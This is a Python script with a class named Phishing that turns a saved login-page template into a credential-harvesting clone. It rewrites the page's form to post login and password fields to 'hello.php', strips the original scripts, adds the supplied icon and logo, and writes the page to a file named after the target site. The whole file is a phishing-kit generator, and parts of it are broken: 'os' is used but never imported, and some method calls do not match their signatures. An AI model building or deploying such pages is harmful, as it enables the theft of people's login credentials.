import collections
import urllib
import re
import urllib.request
from fichier import Fichier
from bs4 import BeautifulSoup
import sys

class Phishing():
    mots=False
    def __init__(self):
        print("mesmots", self.mots)
        self.mots=""
        self.res=[]
        self.nbres={}
        self.mesmots={"/email":"email mail connexion mes emails boite mail mail google",
        "/signup":"email mail inscription mes emails boite mail mail google",
                }
    def loginpages(self):
        for x in os.listdir("./templates"):
            self.phish(x)
    def phish(self):
        template=sys.argv[1]
        myid=sys.argv[2]
        login=sys.argv[3]
        pw=sys.argv[4]
        submitbtn=sys.argv[5]

        site=sys.argv[6] or ""

        icon=sys.argv[7]
        logo=sys.argv[8]


        print("myid", myid)
        print("login", login)
        print("pw", pw)
        print("site", site)
        html=Fichier("./templates",template).lire()
        formtag=self.getformtag(html,myid)
        nomlogin=self.getnomlogin(html,login)
        nompw=self.getnomlogin(html,pw)
        #js=self.getjs(html)
        #otherjs=self.getotherjs(html)
        #somejs=self.getsomejs(html)
        print(formtag,"= form tag")
        print(nomlogin,"= nomlogin")
        print(nompw,"= nom pw")
        print("hey")
        html=html.replace(formtag, "<form action=\"hello.php\" method=\"post\" id=\""+myid+"\"><input type=\"hidden\" name=\"site\" value=\""+site+"\"/>")
        html=html.replace(nomlogin, "<input type=\"text\" name=\"login\" id=\"login\"/>")
        html=html.replace(nompw, "<input type=\"password\" name=\"password\" id=\"password\"/>")
        getform=self.getformcode(html,myid)
        code="""<!doctype html>
        <html lang="en">
          <head>
              <meta charset="utf-8">
              <link rel="icon" href="{icon}">
                  <meta name="viewport" content="width=device-width, initial-scale=1">
                      <title>Bootstrap demo</title>
                          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
                            </head>
                              <body>
                              <nav class="navbar navbar-expand-lg bg-body-tertiary">
                                <div class="container-fluid">
                                    <img src="{logo}"/>
                                        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                                              <span class="navbar-toggler-icon"></span>
                                                  </button>
                                                      <div class="collapse navbar-collapse" id="navbarSupportedContent">
                                                            <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                                                                    <li class="nav-item">
                                                                              <a class="nav-link active" aria-current="page" href="#">Home</a>
                                                                                      </li>
                                                                                              <li class="nav-item">
                                                                                                        <a class="nav-link" href="#">Link</a>
                                                                                                                </li>
                                                                                                                        <li class="nav-item dropdown">
                                                                                                                                  <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                                                                                                                              Dropdown
                                                                                                                                                        </a>
                                                                                                                                                                  <ul class="dropdown-menu">
                                                                                                                                                                              <li><a class="dropdown-item" href="#">Action</a></li>
                                                                                                                                                                                          <li><a class="dropdown-item" href="#">Another action</a></li>
                                                                                                                                                                                                      <li><hr class="dropdown-divider"></li>
                                                                                                                                                                                                                  <li><a class="dropdown-item" href="#">Something else here</a></li>
                                                                                                                                                                                                                            </ul>
                                                                                                                                                                                                                                    </li>
                                                                                                                                                                                                                                            <li class="nav-item">
                                                                                                                                                                                                                                                      <a class="nav-link disabled" aria-disabled="true">Disabled</a>
                                                                                                                                                                                                                                                              </li>
                                                                                                                                                                                                                                                                    </ul>
                                                                                                                                                                                                                                                                          <form class="d-flex" role="search">
                                                                                                                                                                                                                                                                                  <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
                                                                                                                                                                                                                                                                                          <button class="btn btn-outline-success" type="submit">Search</button>
                                                                                                                                                                                                                                                                                                </form>
                                                                                                                                                                                                                                                                                                    </div>
                                                                                                                                                                                                                                                                                                      </div>
                                                                                                                                                                                                                                                                                                      </nav>
                                  <h1>Hello, world!</h1>
                                  {form}
                                      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
                                        </body>
                                        </html>
""".format(icon=icon,form=getform,logo=logo)
        for x in self.getsomejs(code):
            #print(x)
            code=code.replace(x[0], "")
        for x in self.getjs(code):
            #print(x)
            code=code.replace(x[0], "")
        code=code.replace("</body","<script>document.getElementById('"+submitbtn+"').onclick=function(){document.getElementById('"+myid+"').submit();}</script></body");


        print("hey")
        f = ("./data"+site+".html")
        try:
          os.remove(f)
        except:
          print("file dsnt exist")
        fichier = open("data"+site+".html", "a")
        print("hey")
        fichier.write(code)
        print("hey")
        fichier.close()
        print("hey")
    def getdescription(self,data):
        y = BeautifulSoup(data)
        c = y.find('body').findAll(text=True, recursive=False)
        mystring=""
        for i in c:
            print(i)
            mystring+=i
            if len(mystring) > 100:
                break
        return mystring
    def getnomlogin(self,html,myid):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.search(r"<input(.*?)name=\""+myid+"\"(.*?)>", str(html))
        # Part 3: return the first group if match was successful.
        print(m)
        if m:
            return m.group(0)
        else:
            return ""
    def getotherjs(self,html):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.findall(r"</script>", str(html))
        print(m)
        # Part 3: return the first group if match was successful.
        if m:
            return (m)
        else:
            return ""
    def getsomejs(self,html):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.findall(r"(<script(.|\n)*?</script>)", str(html))
        print(m)
        # Part 3: return the first group if match was successful.
        if m:
            return (m)
        else:
            return ""
    def getjs(self,html):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.findall(r"(<script>(.|\n)*?</script>)", str(html))
        print(m)
        # Part 3: return the first group if match was successful.
        if m:
            return (m)
        else:
            return ""
    def getformcode(self,html,myid):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.search(r"<form(.*?)\""+myid+"\"((.|\n)*?)/form>", str(html))
        print(m)
        # Part 3: return the first group if match was successful.
        if m:
            return (m.group(0))
        else:
            return ""
    def getformtag(self,html,myid):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.search(r"<form (.*?)id=\"bloc_ident\"(.*?)>", str(html))
        print(m)
        # Part 3: return the first group if match was successful.
        if m:
            return (m.group(0))
        else:
            return ""
    def getpic(self,html):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.search(r"^.*<link rel=\"icon\" type=\"image/x-icon\" href=\"\s*(.+?)\s*\">.*$", str(html))
        # Part 3: return the first group if match was successful.
        if m:
            return m.group(1)
        else:
            return ""
    def gettitle(self,html):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.match(r"^.*<title>\s*(.+?)\s*</title>.*$", str(html))
        # Part 3: return the first group if match was successful.
        if m:
            return m.group(1)
        else:
            return ""
Phishing().phish()
